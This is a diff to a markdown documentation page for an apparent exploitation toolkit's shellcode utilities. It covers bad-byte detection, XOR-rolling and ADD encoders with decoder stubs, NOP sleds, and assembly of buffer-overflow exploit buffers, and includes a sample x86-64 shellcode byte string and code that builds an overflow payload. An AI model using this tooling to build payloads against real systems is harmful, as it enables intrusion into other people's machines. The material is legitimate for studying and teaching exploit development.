@@ -1,22 +1,99 @@
-# Payload formatting
+# Payload Formatting
 
-Bad-byte checks, XOR/ADD encoding, NOP generation and buffer assembly helpers.
-
----
-
-## What it does
-
-Bad-byte checks, XOR/ADD encoding, NOP generation and buffer assembly helpers.
+Detect bad bytes in shellcode, apply XOR rolling or ADD byte encoding to produce null-free and metacharacter-free payloads, generate architecture-appropriate NOP sleds, and assemble complete exploit buffers (padding + NOP sled + shellcode + return address) — the toolchain for producing a deliverable payload from verified shellcode — via `ablation/core/shellcode_utils.py`.
 
 ---
 
-## Implementation
+## Why this exists
 
-- [`shellcode_utils.py`](../../ablation/core/shellcode_utils.py)
-- [`bare_adapter.py`](../../modules/bare_adapter.py)
+1. **`detect_bad_bytes()` identifies which bytes in a shellcode payload will corrupt the delivery** — many vulnerability classes terminate shellcode on encountering `\x00` (null terminator in string copies), `\x0a` (newline in line-based protocols), `\x0d` (carriage return), or `\x20` (space in argument parsing). `detect_bad_bytes()` checks a shellcode byte sequence against a configurable `bad_bytes` set and reports each byte value and its offset, allowing the analyst to determine whether encoding is required before delivery.
+
+2. **`encode_xor_rolling()` and `encode_add()` transform shellcode to eliminate bad bytes** — `encode_xor_rolling()` XORs each byte with a rolling key (initial key XOR'd with the previous plaintext byte) and prepends a decoder stub that reverses the operation at runtime. `encode_add()` applies a static ADD transformation and prepends a SUB decoder. Both functions return `(encoded_payload, decoder_stub)`. `nop_sled()` generates platform-appropriate NOP sequences: `\x90` on x86-64, `nop` instruction encoding on ARM64, and NOPs appropriate for MIPS32 and RISCV.
+
+3. **`build_exploit_buffer()` assembles a complete buffer for delivery** — it concatenates the padding bytes (to fill the buffer to the overflow offset), the NOP sled, the encoded shellcode, and the return address (repeated to overwrite saved RIP/EIP). The return address is formatted as a little-endian 8-byte value for x86-64 or 4-byte for x86. `shellcode_length()` audits the assembled buffer by section to confirm the layout matches the intended crash offset.
+
+---
+
+## How it works
+
+```mermaid
+flowchart TD
+    A["detect_bad_bytes(shellcode, bad_bytes=b'\\x00\\x0a\\x0d') → list\n  Scan each byte in shellcode\n  If byte in bad_bytes set:\n    → [{offset, byte_value, hex_repr}]\n  Return empty list if no bad bytes found"] --> B["encode_xor_rolling(shellcode, key=None) → (encoded, decoder_stub)\n  key: random single byte if not specified\n  encoded[i] = shellcode[i] ^ key ^ shellcode[i-1]  (rolling)\n  Prepend x86-64 decoder stub:\n    XOR loop: LODSB + XOR [RSI-1], AL + CMP RSI, end + JNZ\n  → (encoded_bytes, decoder_stub_bytes)\n\nencode_add(shellcode, key=0x35) → (encoded, decoder_stub)\n  encoded[i] = (shellcode[i] - key) & 0xFF\n  SUB decoder stub: SUBB [ptr], imm8 loop\n  → (encoded_bytes, decoder_stub_bytes)"]
+    B --> C["nop_sled(size, platform) → bytes\n  x86_64: b'\\x90' * size\n  arm64:  b'\\x1f\\x20\\x03\\xd5' * (size//4)  (NOP=HINT#0)\n  mips32: b'\\x00\\x00\\x00\\x00' * (size//4)  (SLL $zero,$zero,0)\n  → bytes of length 'size'"]
+    C --> D["build_exploit_buffer(shellcode, offset, ret_addr, arch, nop_size=64) → bytes\n  padding = b'A' * (offset - nop_size - len(shellcode))\n  sled = nop_sled(nop_size, arch)\n  buffer = padding + sled + shellcode + struct.pack('<Q', ret_addr) * 8\n  → bytes of length offset + 8+\n\nshellcode_length(shellcode) → dict\n  → {total, sections: {nop_sled, shellcode, padding, ret_addr}}"]
+```
+
+---
+
+## Usage
+
+```python
+from ablation.core.shellcode_utils import (
+    detect_bad_bytes, encode_xor_rolling,
+    nop_sled, build_exploit_buffer, shellcode_length
+)
+
+# Check shellcode for bad bytes
+sc = b'\x48\x31\xff\x57\x57\x5e\xb0\x3b\x0f\x05'
+bad = detect_bad_bytes(sc, bad_bytes=b'\x00\x0a\x0d')
+if bad:
+    print(f"Bad bytes: {[hex(b['byte_value']) for b in bad]}")
+    encoded, decoder = encode_xor_rolling(sc, key=0x42)
+    payload = decoder + encoded
+else:
+    payload = sc
+
+# Build complete exploit buffer
+buffer = build_exploit_buffer(
+    shellcode=payload,
+    offset=264,     # cyclic pattern offset from crash-offset page
+    ret_addr=0x7ffe00000000,
+    arch='x86_64',
+    nop_size=32
+)
+print(f"Buffer length: {len(buffer)}")
+print(shellcode_length(buffer))
+```
+
+---
+
+## Example output
+
+The following illustrates payload formatting output format.
+
+```
+detect_bad_bytes: shellcode (10 bytes)
+
+  No bad bytes found (against \\x00 \\x0a \\x0d)
+
+build_exploit_buffer:
+
+  Total: 280 bytes
+  sections:
+    padding:   200 bytes ('A' * 200)
+    nop_sled:   32 bytes (\\x90 * 32)
+    shellcode:  10 bytes
+    ret_addr:   8 bytes (0x7ffe00000000, LE)
+    padding2:   30 bytes (repeating ret_addr)
+```
+
+---
+
+## False positives
+
+**`detect_bad_bytes()` context-dependent bad bytes** — the set of bad bytes is protocol-dependent. A payload delivered over a base64 channel has no bad bytes. A payload delivered via a format string exploit may have different bad byte constraints (e.g., `%` metacharacter). Always specify the correct `bad_bytes` set for the delivery mechanism.
+
+**`encode_xor_rolling()` decoder stub incompatibility** — the included XOR decoder stub is x86-64 and assumes the shellcode is mapped as RWX. If the target uses NX/DEP, the decoder cannot write to the shellcode segment. In this case, the ROP chain from `crash-offset-and-rop-helpers.md` must map new RWX memory before invoking the decoder.
+
+---
+
+## Pipeline position
+
+Payload formatting is the final step before delivery. Run `detect_bad_bytes()` on shellcode generated by `shellcode_utils` reverse-TCP or staged-loader functions, encode if needed, then use `build_exploit_buffer()` to produce the deliverable payload at the correct crash offset.
 
 ---
 
 ## See also
 
-- [Vuln Scanners](vuln-scanners.md) — module-level reference with constructor patterns and usage examples
+- [Crash Offset and ROP Helpers](crash-offset-and-rop-helpers.md) — cyclic pattern offset calculation and ROP chain construction
+- [Host Platform Inventory](host-platform-inventory.md) — ASLR/NX status that determines whether payload delivery requires mitigation bypass
